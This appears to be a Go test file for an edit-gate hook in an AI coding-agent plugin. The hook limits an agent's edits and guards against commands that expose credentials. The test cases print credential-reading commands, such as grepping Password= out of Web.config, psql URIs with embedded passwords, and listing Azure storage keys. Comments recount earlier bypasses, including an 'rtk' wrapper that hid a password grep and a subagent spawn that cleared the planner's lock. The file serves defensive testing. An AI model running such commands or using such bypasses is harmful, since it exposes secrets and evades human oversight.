		// ---- credential guard round 2 (2026-09-18 review, Part 1) ----
		{
			name:           "rg -o Password asks",
			payload:        payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": `rg -o 'Password=[^;]*' Web.config`}}),
			want:           "ask",
			reasonContains: []string{"stored credentials"},
		},
		{
			// The default shape of the incident on this machine: the user's own
			// global instructions put `rtk` in front of every command, so the
			// segment head was `rtk` and the guard never looked past it.
			name:    "rtk-wrapped grep -o Password asks",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": `rtk grep -o 'Password=[^;]*' Web.config`}}),
			want:    "ask",
		},
		{
			name:    "rtk-wrapped rg -o Password asks",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": `rtk rg -o 'Password=[^;]*' Web.config`}}),
			want:    "ask",
		},
		{
			name:    "findstr Password= asks",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": `findstr /R "Password=.*" Web.config`}}),
			want:    "ask",
		},
		{
			// No -o: grep still prints the whole matching line, exposing the
			// value one line earlier than the -o form does.
			name:    "grep Password= with no -o asks",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": `grep "Password=" app/Web.config`}}),
			want:    "ask",
		},
		{
			name:    "psql postgresql URI with embedded credentials asks",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": `psql "postgresql://app:hunter2@host:5432/db" -c "select 1"`}}),
			want:    "ask",
		},
		{
			name:    "psql postgres URI spelling asks",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": `psql "postgres://app:hunter2@host:5432/db" -c "select 1"`}}),
			want:    "ask",
		},
		{
			name:    "pg_dump with the same URI asks",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": `pg_dump "postgresql://app:hunter2@host:5432/db" > dump.sql`}}),
			want:    "ask",
		},
		{
			name:    "az storage account keys list asks",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": `az storage account keys list -n acct -g rg`}}),
			want:    "ask",
		},
		{
			// A commit message that merely quotes the env-var shape must never
			// ask: memory-sweep.cjs now tells the model to save credential
			// rules, so the save prompt itself must not trip the guard either.
			name:    "commit message quoting PGPASSWORD= stays silent",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": `git commit -m "docs: set PGPASSWORD= in CI"`}}),
			want:    "",
		},
		{
			name:    "memory add quoting PGPASSWORD= stays silent",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": `kratos memory add "never set PGPASSWORD= by hand" --category rule`}}),
			want:    "",
		},
		{
			name:    "rtk-wrapped grep for a bare keyword with no = stays silent",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": `rtk grep -rn password src/`}}),
			want:    "",
		},
		{
			name:    "rg for a bare keyword with no = stays silent",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": `rg -n Password src/Login.tsx`}}),
			want:    "",
		},
		{
			name:    "commit message about a password= parsing bug stays silent",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": `git commit -m "fix password= parsing bug"`}}),
			want:    "",
		},
		{
			name:    "plain psql query with no credential stays silent",
			payload: payloadJSON(map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": `psql -h host -U app -c "select 1"`}}),
			want:    "",
		},
		// ---- precedence: deny wins over ask (Part 1e) ----
		{
			// Inline Odysseus's own read-only-shell rule hard-denies this
			// command (psql is not on the allowlist) regardless of the
			// credential it also carries. Returning "ask" here would downgrade
			// that hard deny to a permission prompt the user could accept.
			name:    "credential command denied by inline odysseus stays a deny, not ask",
			payload: payloadJSON(map[string]any{"session_id": "sess-1", "cwd": "C:/repo", "tool_name": "Bash", "tool_input": map[string]any{"command": `PGPASSWORD=hunter2 psql -h host -U app -c "select 1"`}}),
			ledger:  map[string]any{"inline_god": "odysseus", "cwd": "C:/repo"},
			want:    "deny",
		},
		{
			// Same precedence for a spawned Odysseus (agent_type route).
			name:    "credential command denied by spawned odysseus stays a deny, not ask",
			payload: payloadJSON(map[string]any{"agent_type": "kratos:odysseus", "tool_name": "Bash", "tool_input": map[string]any{"command": `PGPASSWORD=hunter2 psql -h host -U app -c "select 1"`}}),
			want:    "deny",
		},
		{
			// The credential guard's own "spawned agents are never
			// budget-gated" invariant: the ask verdict carries no ledger
			// write, and the ledger passed in must come back unwritten.
			name:    "incident command from a spawned ares still writes nothing",
			payload: payloadJSON(map[string]any{"agent_type": "kratos:ares", "session_id": "sess-1", "cwd": "C:/repo", "tool_name": "Bash", "tool_input": map[string]any{"command": `grep -o 'Password=[^;]*' Web.config | cut -d= -f2`}}),
			ledger:  irisLedger("C:/repo/src/a.ts"),
			want:    "ask",
		},
		// ---- skill load arms the gate (Fix 4) ----
		{
			name:       "skill load addresses iris by name",
			payload:    payloadJSON(map[string]any{"session_id": "sess-1", "cwd": "C:/repo", "tool_name": "Skill", "tool_input": map[string]any{"skill": "kratos:iris"}}),
			ledger:     map[string]any{"session_id": "sess-1", "cwd": "C:/repo"},
			want:       "",
			wantSetGod: "iris",
		},
		{
			// kratos:plan resolves through inlineGodAliases to odysseus, same as
			// the slash-command route.
			name:       "skill load for plan resolves to odysseus",
			payload:    payloadJSON(map[string]any{"session_id": "sess-1", "cwd": "C:/repo", "tool_name": "Skill", "tool_input": map[string]any{"skill": "kratos:plan"}}),
			ledger:     map[string]any{"session_id": "sess-1", "cwd": "C:/repo"},
			want:       "",
			wantSetGod: "odysseus",
		},
		{
			name:       "skill load for auto changes nothing",
			payload:    payloadJSON(map[string]any{"session_id": "sess-1", "cwd": "C:/repo", "tool_name": "Skill", "tool_input": map[string]any{"skill": "kratos:auto"}}),
			ledger:     map[string]any{"session_id": "sess-1", "cwd": "C:/repo", "inline_god": "iris"},
			want:       "",
			wantSetGod: "",
		},
		{
			name:       "skill load for status changes nothing",
			payload:    payloadJSON(map[string]any{"session_id": "sess-1", "cwd": "C:/repo", "tool_name": "Skill", "tool_input": map[string]any{"skill": "kratos:status"}}),
			ledger:     map[string]any{"session_id": "sess-1", "cwd": "C:/repo", "inline_god": "iris"},
			want:       "",
			wantSetGod: "",
		},
		{
			// A spawned subagent's own Skill call never rebinds the session — the
			// spawned-subagent branch (step 1) returns before the Skill check.
			name:       "spawned agent's skill load is ignored",
			payload:    payloadJSON(map[string]any{"session_id": "sess-1", "cwd": "C:/repo", "agent_type": "kratos:ares", "tool_name": "Skill", "tool_input": map[string]any{"skill": "kratos:iris"}}),
			ledger:     map[string]any{"session_id": "sess-1", "cwd": "C:/repo", "inline_god": "odysseus"},
			want:       "",
			wantSetGod: "",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			var input preToolUseInput
			if err := json.Unmarshal([]byte(tc.payload), &input); err != nil {
				t.Fatalf("payload does not unmarshal: %v", err)
			}
			got := editGateDecision(input, tc.ledger)

			if got.Decision != tc.want {
				t.Fatalf("decision = %q, want %q (reason %q)", got.Decision, tc.want, got.Reason)
			}
			for _, want := range tc.reasonContains {
				if !strings.Contains(got.Reason, want) {
					t.Errorf("reason %q does not contain %q", got.Reason, want)
				}
			}
			if wrote := got.Files != nil; wrote != tc.wantWrite {
				t.Fatalf("ledger write = %v (files %v), want %v", wrote, got.Files, tc.wantWrite)
			}
			if got.ClearGod != tc.wantClear {
				t.Fatalf("ClearGod = %v, want %v", got.ClearGod, tc.wantClear)
			}
			if got.SetGod != tc.wantSetGod {
				t.Fatalf("SetGod = %q, want %q", got.SetGod, tc.wantSetGod)
			}
			if !tc.wantWrite {
				return
			}
			if len(got.Files) != len(tc.wantFiles) {
				t.Fatalf("files = %v, want %v", got.Files, tc.wantFiles)
			}
			for i, want := range tc.wantFiles {
				if got.Files[i] != normalizeLedgerPath(want) {
					t.Errorf("files[%d] = %q, want %q", i, got.Files[i], normalizeLedgerPath(want))
				}
			}
		})
	}
}

// TestEditGateWritesLedger covers the end-to-end hook: a counted edit appends
// to the ledger on disk, unknown keys survive, and a deny prints the reason.
func TestEditGateWritesLedger(t *testing.T) {
	home := t.TempDir()
	setHomeEnv(t, home)
	sessionID := "sess-editgate"
	ledgerPath := filepath.Join(home, ".kratos", "sessions", sessionID+".json")
	if err := os.MkdirAll(filepath.Dir(ledgerPath), 0o755); err != nil {
		t.Fatal(err)
	}
	seed := map[string]any{
		"session_id": sessionID,
		"project":    "repo",
		"cwd":        "C:/repo",
		"started_at": 1234567890,
		"source":     "startup",
		"inline_god": "iris",
	}
	raw, _ := json.Marshal(seed)
	if err := os.WriteFile(ledgerPath, raw, 0o644); err != nil {
		t.Fatal(err)
	}

	write := func(file string) {
		handleEditGate([]byte(payloadJSON(map[string]any{
			"session_id": sessionID, "cwd": "C:/repo", "tool_name": "Write",
			"tool_input": map[string]any{"file_path": file},
		})))
	}

	write("C:/repo/src/a.ts")
	write("C:/repo/src/b.ts")
	write("C:/repo/src/a.ts") // repeat — still two files

	m, err := readInlineLedger(sessionID)
	if err != nil {
		t.Fatalf("read ledger: %v", err)
	}
	files := ledgerStrings(m)
	if len(files) != 2 {
		t.Fatalf("inline_edited_files = %v, want 2 entries", files)
	}
	for _, key := range []string{"session_id", "project", "cwd", "started_at", "source", "inline_god"} {
		if _, ok := m[key]; !ok {
			t.Errorf("ledger lost key %q on write", key)
		}
	}

	// The third distinct file is denied, and the ledger is not touched.
	input := preToolUseInput{
		ToolName:  "Write",
		SessionID: sessionID,
		Cwd:       "C:/repo",
		ToolInput: preToolUseToolInput{FilePath: "C:/repo/src/c.ts"},
	}
	res := editGateDecision(input, m)
	if res.Decision != "deny" {
		t.Fatalf("third file decision = %q, want deny", res.Decision)
	}
	if res.Files != nil {
		t.Error("a deny must not write the ledger")
	}
}

// TestHooksJSONRegistersEditGate pins the wiring: one gate, on the matcher that
// covers the writes, the shell and the dispatch reset — and no trace of the
// retired plan-mode guard, whose file this feature deletes.
func TestHooksJSONRegistersEditGate(t *testing.T) {
	hooksDir := filepath.Join("..", "..", "..", "..", "plugins", "kratos", "hooks")
	data, err := os.ReadFile(filepath.Join(hooksDir, "hooks.json"))
	if err != nil {
		t.Fatalf("cannot read hooks.json: %v", err)
	}
	body := string(data)
	if !strings.Contains(body, "hook edit-gate") {
		t.Error("hooks.json does not register `hook edit-gate`")
	}
	if !strings.Contains(body, `"Write|Edit|MultiEdit|NotebookEdit|Bash|PowerShell|Agent|Task|Skill"`) {
		t.Error("edit-gate matcher must cover Write|Edit|MultiEdit|NotebookEdit|Bash|PowerShell|Agent|Task|Skill")
	}
	if strings.Contains(body, "plan-mode-guard") {
		t.Error("hooks.json still references the retired plan-mode-guard.cjs")
	}
	if _, err := os.Stat(filepath.Join(hooksDir, "plan-mode-guard.cjs")); err == nil {
		t.Error("plan-mode-guard.cjs still exists; the gate replaced it")
	}
}

// TestSessionStartPreservesLedgerKeys pins the compaction fix: registerSession
// rebuilt the state file from scratch, so a mid-session SessionStart ("compact"
// or "resume") erased inline_god and inline_edited_files and switched the gate
// off for the rest of the session.
func TestSessionStartPreservesLedgerKeys(t *testing.T) {
	path := filepath.Join("..", "..", "..", "..", "plugins", "kratos", "hooks", "session-start.cjs")
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("cannot read session-start.cjs: %v", err)
	}
	if !strings.Contains(string(data), "...prev") {
		t.Error("registerSession must spread the previous state file, or it erases the edit gate's keys on compaction")
	}
}

// hooksDirPath is plugins/kratos/hooks from the package directory.
func hooksDirPath() string {
	return filepath.Join("..", "..", "..", "..", "plugins", "kratos", "hooks")
}

// readLedgerFor reads the ledger of an arbitrary session id.
func readLedgerFor(t *testing.T, sessionID string) map[string]any {
	t.Helper()
	m, err := readInlineLedger(sessionID)
	if err != nil {
		t.Fatalf("read ledger %s: %v", sessionID, err)
	}
	return m
}

// TestEditGateMultiTurnOdysseusHandoff walks the sequence that locked a session
// for life: /kratos:plan records Odysseus, the user's "approve" is a plain turn
// (which must NOT clear him — Odysseus implementing his own approved plan is
// the failure this gate exists to stop), and the dispatch to Ares is what ends
// his authority.
func TestEditGateMultiTurnOdysseusHandoff(t *testing.T) {
	setHomeEnv(t, t.TempDir())
	const sessionID = "sess-multiturn"
	const cwd = "C:/repo"

	writeDenied := func(file string) bool {
		out := captureStdout(func() {
			handleEditGate([]byte(payloadJSON(map[string]any{
				"session_id": sessionID, "cwd": cwd, "tool_name": "Write",
				"tool_input": map[string]any{"file_path": file},
			})))
		})
		return strings.Contains(out, `"deny"`)
	}

	// Turn 1 — the launcher records the inline god.
	recordInlineGod(sessionID, cwd, "/kratos:plan move the sidebar")
	if got := ledgerString(readLedgerFor(t, sessionID), ledgerKeyInlineGod); got != "odysseus" {
		t.Fatalf("inline_god = %q, want odysseus", got)
	}

	// Turn 2 — a plain user turn. The god stays; source edits stay denied.
	recordInlineGod(sessionID, cwd, "approve")
	if got := ledgerString(readLedgerFor(t, sessionID), ledgerKeyInlineGod); got != "odysseus" {
		t.Fatalf("a plain user turn cleared inline_god (= %q); the planner would implement his own plan", got)
	}
	if !writeDenied("C:/repo/src/a.ts") {
		t.Fatal("source write after approval was not denied")
	}

	// A research spawn is not a hand-off. Odysseus's own protocol tells him to
	// dispatch kratos:metis for grounding, and while *any* kratos:<god>
	// cleared the lock that call was a one-step escape: the next Write went
	// through and the planner implemented his own plan.
	captureStdout(func() {
		handleEditGate([]byte(payloadJSON(map[string]any{
			"session_id": sessionID, "cwd": cwd, "tool_name": "Task",
			"tool_input": map[string]any{"subagent_type": "kratos:metis"},
		})))
	})
	if got := ledgerString(readLedgerFor(t, sessionID), ledgerKeyInlineGod); got != "odysseus" {
		t.Fatalf("a kratos:metis grounding spawn cleared inline_god (= %q); the planner would implement his own plan", got)
	}
	if !writeDenied("C:/repo/src/a.ts") {
		t.Fatal("source write after a grounding spawn was not denied")
	}

	// The hand-off — the plan leaves his hands, and so does his authority.
	captureStdout(func() {
		handleEditGate([]byte(payloadJSON(map[string]any{
			"session_id": sessionID, "cwd": cwd, "tool_name": "Agent",
			"tool_input": map[string]any{"subagent_type": "kratos:ares"},
		})))
	})
	if got := ledgerString(readLedgerFor(t, sessionID), ledgerKeyInlineGod); got != "" {
		t.Fatalf("inline_god = %q after the dispatch, want it cleared", got)
	}

	// Turn 3 — the main context can edit again.
	if writeDenied("C:/repo/src/b.ts") {
		t.Fatal("a main-context write is still denied by the odysseus rule after the hand-off")
	}
}

// TestEditGateSkillLoadArmsInlineGod walks the route 0 of 19 real ledgers ever
// recorded: a user addressing a god by name routes through Skill(kratos:iris)
// rather than a typed slash command, so inlineGodFromPrompt never fires and
// inline_god was never written. This exercises the fix end to end, on disk.
func TestEditGateSkillLoadArmsInlineGod(t *testing.T) {
	setHomeEnv(t, t.TempDir())
	const sessionID = "sess-skillload"
	const cwd = "C:/repo"

	skillCall := func(skill string, extra map[string]any) {
		payload := map[string]any{
			"session_id": sessionID, "cwd": cwd, "tool_name": "Skill",
			"tool_input": map[string]any{"skill": skill},
		}
		for k, v := range extra {
			payload[k] = v
		}
		captureStdout(func() { handleEditGate([]byte(payloadJSON(payload))) })
	}
	write := func(file string) {
		captureStdout(func() {
			handleEditGate([]byte(payloadJSON(map[string]any{
				"session_id": sessionID, "cwd": cwd, "tool_name": "Write",
				"tool_input": map[string]any{"file_path": file},
			})))
		})
	}

	// Seed the ledger the way session-start.cjs would, with no inline_god yet.
	if err := writeInlineLedger(sessionID, map[string]any{"session_id": sessionID, "cwd": cwd}); err != nil {
		t.Fatal(err)
	}

	// "iris, ..." routes Skill(kratos:auto) then Skill(kratos:iris). auto has
	// no agent definition and changes nothing; iris arms the gate.
	skillCall("kratos:auto", nil)
	if got := ledgerString(readLedgerFor(t, sessionID), ledgerKeyInlineGod); got != "" {
		t.Fatalf("kratos:auto set inline_god = %q, want unset", got)
	}
	skillCall("kratos:iris", nil)
	if got := ledgerString(readLedgerFor(t, sessionID), ledgerKeyInlineGod); got != "iris" {
		t.Fatalf("inline_god = %q after Skill(kratos:iris), want iris", got)
	}

	// Iris edits two files — the budget fills exactly as it would for the
	// slash-command route.
	write("C:/repo/src/a.ts")
	write("C:/repo/src/b.ts")
	if got := ledgerStrings(readLedgerFor(t, sessionID)); len(got) != 2 {
		t.Fatalf("inline_edited_files = %v, want 2 entries", got)
	}

	// Relaunching the same god (the user says "iris, ..." again) must not
	// refill the budget — a third file stays denied.
	skillCall("kratos:iris", nil)
	if got := ledgerStrings(readLedgerFor(t, sessionID)); len(got) != 2 {
		t.Fatalf("inline_edited_files = %v after relaunching iris, want unchanged", got)
	}
	out := captureStdout(func() {
		handleEditGate([]byte(payloadJSON(map[string]any{
			"session_id": sessionID, "cwd": cwd, "tool_name": "Write",
			"tool_input": map[string]any{"file_path": "C:/repo/src/c.ts"},
		})))
	})
	if !strings.Contains(out, `"deny"`) {
		t.Fatal("a third file was not denied after relaunching the same god via Skill")
	}

	// A spawned agent's own Skill call never rebinds the session.
	skillCall("kratos:iris", map[string]any{"agent_type": "kratos:ares"})
	if got := ledgerString(readLedgerFor(t, sessionID), ledgerKeyInlineGod); got != "iris" {
		t.Fatalf("inline_god = %q after a spawned agent's Skill call, want unchanged (iris)", got)
	}

	// "plan the sidebar" routes Skill(kratos:plan), which resolves to odysseus
	// and refills the budget — a new god is a new turn.
	skillCall("kratos:plan", nil)
	if got := ledgerString(readLedgerFor(t, sessionID), ledgerKeyInlineGod); got != "odysseus" {
		t.Fatalf("inline_god = %q after Skill(kratos:plan), want odysseus", got)
	}
	if got := ledgerStrings(readLedgerFor(t, sessionID)); len(got) != 0 {
		t.Fatalf("inline_edited_files = %v after a god change, want empty", got)
	}
}

// TestEditGateSkillLoadCreatesLedgerWhenMissing covers Fix 4's own gap: a
// Skill(kratos:iris) call in a session whose ledger is missing (session-start
// never wrote one, or it is unparseable) used to arm nothing at all — the
// write was guarded by `ledger != nil` and editGateDecisionRest returns at
// its own no-ledger step before it ever reaches the Skill rule. This walks
// the same route end to end, on disk, with no ledger seeded first.
func TestEditGateSkillLoadCreatesLedgerWhenMissing(t *testing.T) {
	setHomeEnv(t, t.TempDir())
	const sessionID = "sess-skillload-noledger"
	const cwd = "C:/repo"

	// No writeInlineLedger call here — the session has no ledger file at all.
	out := captureStdout(func() {
		handleEditGate([]byte(payloadJSON(map[string]any{
			"session_id": sessionID, "cwd": cwd, "tool_name": "Skill",
			"tool_input": map[string]any{"skill": "kratos:iris"},
		})))
	})
	if out != "" {
		t.Fatalf("a Skill load must never itself produce a decision, got %q", out)
	}

	m, err := readInlineLedger(sessionID)
	if err != nil {
		t.Fatalf("expected a ledger to exist after the Skill load: %v", err)
	}
	if got := ledgerString(m, ledgerKeyInlineGod); got != "iris" {
		t.Fatalf("inline_god = %q, want iris", got)
	}
	if got := ledgerString(m, ledgerKeyCwd); got != cwd {
		t.Fatalf("cwd = %q, want %q", got, cwd)
	}

	// The budget behaves exactly as it does when session-start seeded the
	// ledger first: two files allowed, a third denied.
	write := func(file string) string {
		return captureStdout(func() {
			handleEditGate([]byte(payloadJSON(map[string]any{
				"session_id": sessionID, "cwd": cwd, "tool_name": "Write",
				"tool_input": map[string]any{"file_path": file},
			})))
		})
	}
	write("C:/repo/src/a.ts")
	write("C:/repo/src/b.ts")
	if got := ledgerStrings(readLedgerFor(t, sessionID)); len(got) != 2 {
		t.Fatalf("inline_edited_files = %v, want 2 entries", got)
	}
	if out := write("C:/repo/src/c.ts"); !strings.Contains(out, `"deny"`) {
		t.Fatal("a third file was not denied for a god armed from a Skill load with no prior ledger")
	}
}

// TestEditGateFailsOpenOnBadInput covers the two inputs the gate cannot trust:
// a ledger file that is not an object, and a payload that is not a payload.
// Neither may produce a deny.
func TestEditGateFailsOpenOnBadInput(t *testing.T) {
	home := t.TempDir()
	setHomeEnv(t, home)
	const sessionID = "sess-badinput"
	dir := filepath.Join(home, ".kratos", "sessions")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	payload := payloadJSON(map[string]any{
		"session_id": sessionID, "cwd": "C:/repo", "tool_name": "Write",
		"tool_input": map[string]any{"file_path": "C:/repo/src/c.ts"},
	})

	for _, tc := range []struct{ name, body string }{
		{"truncated json", `{"inline_god": "iris"`},
		{"json array", `["iris"]`},
		{"json string", `"iris"`},
		{"json null", `null`},
		{"empty file", ""},
		{"binary junk", "\x00\x01\x02"},
	} {
		t.Run("ledger "+tc.name, func(t *testing.T) {
			if err := os.WriteFile(filepath.Join(dir, sessionID+".json"), []byte(tc.body), 0o644); err != nil {
				t.Fatal(err)
			}
			if out := captureStdout(func() { handleEditGate([]byte(payload)) }); out != "" {
				t.Errorf("output %q, want none", out)
			}
		})
	}

	for _, raw := range []string{"", "not json at all", "[]", "null", "{", "\x00"} {
		t.Run("stdin "+raw, func(t *testing.T) {
			if out := captureStdout(func() { handleEditGate([]byte(raw)) }); out != "" {
				t.Errorf("output %q, want none", out)
			}
		})
	}
}

// TestWriteInlineLedgerErrors pins the write failure paths: they return an
// error (which the gate logs and ignores) and leave no temp file behind.
func TestWriteInlineLedgerErrors(t *testing.T) {
	home := t.TempDir()
	setHomeEnv(t, home)

	if err := writeInlineLedger("", map[string]any{"a": 1}); err == nil {
		t.Error("writeInlineLedger with no session id returned nil")
	}

	// A directory where the ledger file belongs: the rename cannot land.
	const blocked = "sess-blocked"
	path := sessionLedgerFile(blocked)
	if err := os.MkdirAll(path, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := writeInlineLedger(blocked, map[string]any{"a": 1}); err == nil {
		t.Error("writeInlineLedger over a directory returned nil")
	}

	// A value JSON cannot marshal.
	if err := writeInlineLedger("sess-unmarshalable", map[string]any{"ch": make(chan int)}); err == nil {
		t.Error("writeInlineLedger with an unmarshalable value returned nil")
	}

	entries, err := os.ReadDir(filepath.Dir(path))
	if err != nil {
		t.Fatal(err)
	}
	for _, e := range entries {
		if strings.HasSuffix(e.Name(), ".tmp") {
			t.Errorf("failed write left the temp file %s behind", e.Name())
		}
	}

	// The happy path still lands, and the temp file is gone.
	if err := writeInlineLedger("sess-ok", map[string]any{"inline_god": "iris"}); err != nil {
		t.Fatalf("writeInlineLedger: %v", err)
	}
	if got := ledgerString(readLedgerFor(t, "sess-ok"), ledgerKeyInlineGod); got != "iris" {
		t.Errorf("inline_god = %q, want iris", got)
	}
}

// TestDocsPinIrisFileBudget keeps the prose and the constant together: three
// documents state the budget in words, and changing irisFileBudget while they
// still say "two" ships a lie to the reader and to Iris herself.
func TestDocsPinIrisFileBudget(t *testing.T) {
	if irisFileBudget != 2 {
		t.Fatalf("irisFileBudget = %d: update README.md, hooks/README.md and agents/iris.md, then this test", irisFileBudget)
	}
	pluginDir := filepath.Join("..", "..", "..", "..", "plugins", "kratos")
	for _, tc := range []struct{ path, want string }{
		{filepath.Join(pluginDir, "README.md"), "two distinct project source files per user turn"},
		{filepath.Join(pluginDir, "hooks", "README.md"), "two source files per turn"},
		{filepath.Join(pluginDir, "agents", "iris.md"), "third distinct source file"},
	} {
		data, err := os.ReadFile(tc.path)
		if err != nil {
			t.Fatalf("cannot read %s: %v", tc.path, err)
		}
		if !strings.Contains(string(data), tc.want) {
			t.Errorf("%s no longer states the budget as %q", tc.path, tc.want)
		}
	}
}

// TestGateProjectFileMatchesJS runs the Go port and the JS original over one
// fixture. isGateProjectFile is a port of hooks/tool-use.cjs isProjectFile, and
// the two deciding "project work" differently would count Iris's edits under
// one rule and record them under another. RecordedOnly marks the one deliberate
// split: pipeline deliverables and Arena shards are recorded as project work
// but never spend the gate's source-file budget.
func TestGateProjectFileMatchesJS(t *testing.T) {
	node, err := exec.LookPath("node")
	if err != nil {
		t.Skip("node not available")
	}
	cases := []struct {
		File         string `json:"file"`
		Cwd          string `json:"cwd"`
		Want         bool   `json:"want"`
		RecordedOnly bool   `json:"recordedOnly"`
	}{
		{File: "C:/repo/src/a.ts", Cwd: "C:/repo", Want: true},
		{File: "C:/repo/src/nested/deep/a.ts", Cwd: "C:/repo", Want: true},
		{File: "C:/repo/.claude/feature/x/status.json", Cwd: "C:/repo", Want: false, RecordedOnly: true},
		{File: "C:/repo/.claude/.Arena/conventions.md", Cwd: "C:/repo", Want: false, RecordedOnly: true},
		{File: "C:/repo/.claude/tmp/probe.ts", Cwd: "C:/repo", Want: false},
		{File: "C:/repo/.kratos/bin/kratos", Cwd: "C:/repo", Want: false},
		{File: "C:/repo/.git/config", Cwd: "C:/repo", Want: false},
		{File: "C:/repo/tmp/claude/scratch/probe.ts", Cwd: "C:/repo", Want: false},
		{File: "C:/repo/temp/claude/probe.ts", Cwd: "C:/repo", Want: false},
		{File: "C:/repo/src/.claudecache/a.ts", Cwd: "C:/repo", Want: true},
		{File: "D:/elsewhere/src/a.ts", Cwd: "C:/repo", Want: false},
		{File: "C:/repo", Cwd: "C:/repo", Want: false},
		{File: "", Cwd: "C:/repo", Want: false},
		{File: "C:/repo/src/a.ts", Cwd: "", Want: false},
		{File: "C:/repo/src/a.ts", Cwd: "C:/repo/", Want: true},
		{File: "c:/REPO/src/a.ts", Cwd: "C:/repo", Want: true},
		{File: `C:\repo\src\a.ts`, Cwd: `C:\repo`, Want: true},
		{File: "C:/repo//src//a.ts", Cwd: "C:/repo", Want: true},
		{File: "/home/u/repo/src/a.ts", Cwd: "/home/u/repo", Want: true},
		{File: "/home/u/repo/.claude/x.md", Cwd: "/home/u/repo", Want: false},
	}

	for _, tc := range cases {
		if got := isGateProjectFile(tc.File, tc.Cwd); got != tc.Want {
			t.Errorf("Go isGateProjectFile(%q, %q) = %v, want %v", tc.File, tc.Cwd, got, tc.Want)
		}
	}

	toolUse, err := filepath.Abs(filepath.Join(hooksDirPath(), "tool-use.cjs"))
	if err != nil {
		t.Fatal(err)
	}
	fixture, err := json.Marshal(cases)
	if err != nil {
		t.Fatal(err)
	}
	script := "const { isProjectFile } = require(" + strconv.Quote(filepath.ToSlash(toolUse)) + ");\n" +
		"const cases = JSON.parse(process.argv[1]);\n" +
		"console.log(JSON.stringify(cases.map((c) => isProjectFile(c.file, c.cwd))));\n"
	out, err := exec.Command(node, "-e", script, string(fixture)).Output()
	if err != nil {
		t.Fatalf("node run failed: %v (%s)", err, out)
	}
	var jsResults []bool
	if err := json.Unmarshal(out, &jsResults); err != nil {
		t.Fatalf("cannot parse node output %q: %v", out, err)
	}
	if len(jsResults) != len(cases) {
		t.Fatalf("node returned %d results for %d cases", len(jsResults), len(cases))
	}
	for i, tc := range cases {
		if want := tc.Want || tc.RecordedOnly; jsResults[i] != want {
			t.Errorf("JS isProjectFile(%q, %q) = %v, want %v", tc.File, tc.Cwd, jsResults[i], want)
		}
	}
}

// TestLaunchCjsDropsStaleBinaryHelp pins W7: a binary too old for the requested
// subcommand prints its parent's cobra help to stdout and exits 0, and that
// help would land in the hook's stdout on every gated call.
func TestLaunchCjsDropsStaleBinaryHelp(t *testing.T) {
	launch, err := filepath.Abs(filepath.Join(hooksDirPath(), "launch.cjs"))
	if err != nil {
		t.Fatal(err)
	}
	data, err := os.ReadFile(launch)
	if err != nil {
		t.Fatalf("cannot read launch.cjs: %v", err)
	}
	if !strings.Contains(string(data), "looksLikeCobraHelp(out)") {
		t.Error("the generic spawnSync branch must sniff a stale binary's help output")
	}

	node, err := exec.LookPath("node")
	if err != nil {
		t.Skip("node not available")
	}
	const groupHelp = "Hook handlers for Claude Code events\n\nUsage:\n  kratos hook [command]\n\nAvailable Commands:\n  edit-gate   Handle PreToolUse\n"
	const unknown = "Error: unknown command \"edit-gate\" for \"kratos hook\"\n"
	const realOutput = "{\"hookSpecificOutput\":{\"hookEventName\":\"PreToolUse\",\"permissionDecision\":\"deny\"}}\n"
	fixture, err := json.Marshal([]string{groupHelp, unknown, realOutput, "", "Usage: kratos hook\n"})
	if err != nil {
		t.Fatal(err)
	}
	script := "const { looksLikeCobraHelp } = require(" + strconv.Quote(filepath.ToSlash(launch)) + ");\n" +
		"console.log(JSON.stringify(JSON.parse(process.argv[1]).map(looksLikeCobraHelp)));\n"
	out, err := exec.Command(node, "-e", script, string(fixture)).Output()
	if err != nil {
		t.Fatalf("node run failed: %v (%s)", err, out)
	}
	var got []bool
	if err := json.Unmarshal(out, &got); err != nil {
		t.Fatalf("cannot parse node output %q: %v", out, err)
	}
	want := []bool{true, true, false, false, false}
	for i := range want {
		if got[i] != want[i] {
			t.Errorf("looksLikeCobraHelp case %d = %v, want %v", i, got[i], want[i])
		}
	}
}
